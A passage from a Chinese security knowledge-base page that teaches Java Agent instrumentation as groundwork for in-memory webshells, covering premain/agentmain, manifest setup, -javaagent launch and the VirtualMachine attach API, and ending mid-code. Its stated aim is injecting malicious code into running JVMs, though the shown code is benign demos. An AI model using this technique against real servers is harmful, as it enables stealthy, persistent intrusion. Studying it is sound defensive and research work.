<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/内存马/Java Agent 内存马" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Java Agent 内存马 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Java Agent 内存马"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Java Agent 内存马 | d4m1ts 知识库"><meta data-rh="true" name="description" content="介绍"><meta data-rh="true" property="og:description" content="介绍"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Java Agent 内存马"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Java Agent 内存马" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Java Agent 内存马" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"内存马","item":"https://blog.gm7.org/docs/category/内存马"},{"@type":"ListItem","position":3,"name":"Java Agent 内存马","item":"https://blog.gm7.org/docs/代码审计/Java安全/内存马/Java Agent 内存马"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.4c121756.js" defer="defer"></script>
<script src="/assets/js/main.5f81c564.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="折叠侧边栏分类 &#x27;内存马&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Tomcat内存马">Tomcat内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Spring内存马">Spring内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/内存马/Java Agent 内存马">Java Agent 内存马</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/其他">其他</a><button aria-label="展开侧边栏分类 &#x27;其他&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/内存马"><span>内存马</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Java Agent 内存马</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Java Agent 内存马</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h2>
<p><code>Java agent</code>是一种特殊的Java程序（Jar文件），它是<code>Instrumentation</code>的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过<code>Instrumentation API</code>与虚拟机交互。
在注入内存马的过程中，我们可以利用java instrumentation机制，<strong>动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</strong>。</p>
<p>![Java Intrumentation 和相关应用| 无知是天堂](Java Agent 内存马.assets/VNL1ZF.png)</p>
<p>java作为一种强类型的语言，不通过编译就不能够进行jar包的生成。而有了java agent技术，就可以在字节码这个层面对类和方法进行修改。同时，也可以把java agent理解成一种代码注入的方式。但是这种注入比起spring的aop更加的优美。</p>
<p>Java agent的使用方式有两种：</p>
<ul>
<li>实现<code>premain</code>方法，在JVM启动前加载。</li>
<li>实现<code>agentmain</code>方法，在JVM启动后加载。</li>
</ul>
<p><code>premain</code>和<code>agentmain</code>函数声明如下，拥有<code>Instrumentation inst</code>参数的方法<strong>优先级更高</strong>：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public static void agentmain(String agentArgs, Instrumentation inst) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static void agentmain(String agentArgs) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static void premain(String agentArgs, Instrumentation inst) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public static void premain(String agentArgs) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>第一个参数<code>String agentArgs</code>就是Java agent的参数。</p>
<p>第二个参数<code>Instrumentation inst</code>相当重要，inst 是一个 <code>java.lang.instrument.Instrumentation</code> 的实例，由 JVM 自动传入。<code>java.lang.instrument.Instrumentation</code> 是 <code>instrument</code> 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="premain">premain<a href="#premain" class="hash-link" aria-label="premain的直接链接" title="premain的直接链接">​</a></h2>
<p>这里简单的举例说明<code>premain</code>的使用，创建一个maven项目</p>
<p>编写<code>premain</code>函数</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.lang.instrument.Instrumentation;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Main {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void premain(String agentArgs, Instrumentation inst){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for(int i=0; i &lt; 5; i+=1){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;called premain&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>在<code>resources</code>目录下创建<code>META-INF/MANIFEST.MF</code>，并指定<code>Premain-Class</code>；要注意的是，<strong>最后必须多一个换行</strong>。</p>
<div class="language-manifest codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-manifest codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Manifest-Version: 1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Premain-Class: Main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>![image-20211125162732664](Java Agent 内存马.assets/image-20211125162732664.png)</p>
<p>然后打包成<code>jar</code>文件，在<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code>中配置</p>
<p>![image-20211125162926179](Java Agent 内存马.assets/image-20211125162926179.png)</p>
<p>默认选项就行</p>
<p>![image-20211125162819989](Java Agent 内存马.assets/image-20211125162819989.png)</p>
<p>然后选择<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p>
<p>会在<code>out/artifacts/javaagent_jar</code>目录下生成对应的jar文件</p>
<p>![image-20211125163145403](Java Agent 内存马.assets/image-20211125163145403.png)</p>
<p>随便找个jar文件示例，比如我们写个<code>hello word</code>，使用 <code>-javaagent:agent.jar</code> 参数执行</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-javaagent:javaagent.jar</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> hello.jar</span><br></span></code></pre></div></div>
<p>![image-20211125163755303](Java Agent 内存马.assets/image-20211125163755303.png)</p>
<p>可以发现在<code>hello.jar</code>输出<code>Hello world</code>之前就执行了，具体执行流程大致如下</p>
<p>![premain-流程](Java Agent 内存马.assets/premain-流程.png)</p>
<p>然而这种方法存在一定的局限性：<strong>只能在启动时使用<code>-javaagent</code>参数指定</strong>。</p>
<p>在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载<code>premain</code>。相比之下，<code>agentmain</code>更加实用。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="agentmain">agentmain<a href="#agentmain" class="hash-link" aria-label="agentmain的直接链接" title="agentmain的直接链接">​</a></h2>
<p>写一个<code>agentmain</code>和<code>premain</code>差不多，只需要在<code>META-INF/MANIFEST.MF</code>中加入<code>Agent-Class:</code>即可。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Manifest-Version: 1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Agent-Class: AgentMain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了<code>Attach API</code>。Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code> 包里面。着重关注的是<code>VitualMachine</code>这个类。</p>
<blockquote>
<p>需要依赖<code>VitualMachine</code>的<code>loadAgent</code>达到attach的目的</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="virtualmachine">VirtualMachine<a href="#virtualmachine" class="hash-link" aria-label="VirtualMachine的直接链接" title="VirtualMachine的直接链接">​</a></h3>
<p>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 <code>loadAgent</code>，<code>attach</code> 和 <code>detach</code> 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过<code>loadAgent</code>方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个<code>Instrumentation</code>实例。</p>
<p>![Java成神之路——javaAgent](Java Agent 内存马.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpbmhhb3Rvbmc=,size_16,color_FFFFFF,t_70.png)</p>
<p>具体的用法看一下官方给的例子大概就理解了：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// com.sun.tools.attach.VirtualMachine</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 下面的示例演示如何使用VirtualMachine:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // attach to target VM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        VirtualMachine vm = VirtualMachine.attach(&quot;2177&quot;);  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // start management agent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Properties props = new Properties();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        props.put(&quot;com.sun.management.jmxremote.port&quot;, &quot;5000&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        vm.startManagementAgent(props);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // detach</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        vm.detach();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 在此示例中，我们附加到由进程标识符2177标识的Java虚拟机。然后，使用提供的参数在目标进程中启动JMX管理代理。最后，客户端从目标VM分离。</span><br></span></code></pre></div></div>
<p>下面列几个这个类提供的方法：</p>
<ul>
<li><code>com.sun.tools.attach.VirtualMachine</code></li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public abstract class VirtualMachine {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 获得当前所有的JVM列表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static List&lt;VirtualMachineDescriptor&gt; list() { ... }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 根据pid连接到JVM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static VirtualMachine attach(String id) { ... }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 断开连接</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public abstract void detach() {}</span><br></span><span class="token-line" 